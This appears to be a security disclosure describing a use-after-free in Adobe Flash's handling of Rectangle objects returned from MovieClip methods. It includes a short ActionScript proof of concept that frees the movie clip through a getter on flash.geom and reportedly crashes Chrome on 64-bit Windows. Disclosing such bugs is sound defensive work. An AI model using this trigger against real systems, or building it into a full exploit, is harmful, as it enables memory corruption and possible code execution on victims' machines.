 
Several methods in flash return instances of the Rectangle class. There is a use-after-free in creating these objects for return. If the this object of the call is a MovieClip, the Rectangle instantiation will run on its thread. If a getter is added to this class&#039;s package, it will be invoked when fetching the rectangle constructor, which can free the method&#039;s thread, which will cause the Rectangle constructor to run on a thread which has been freed. A minimal PoC is at follows:
 
var mc = this.createEmptyMovieClip( "mc", 1);
mc.scrollRect = {x : 0, y : 0, height : 10, width : 10}
var r = flash.geom.Rectangle;
var g = flash.geom;
g.addProperty("Rectangle", func, func);
var f = ASnative(900, 405); //scrollRect
mc.f = f;
mc.f();
 
function func(){
     
    mc.removeMovieClip();
     
    // fix heap
     
    return r;
     
    }
     
 
A PoC and swf are attached. The PoC crashes in Chrome on 64-bit Windows.
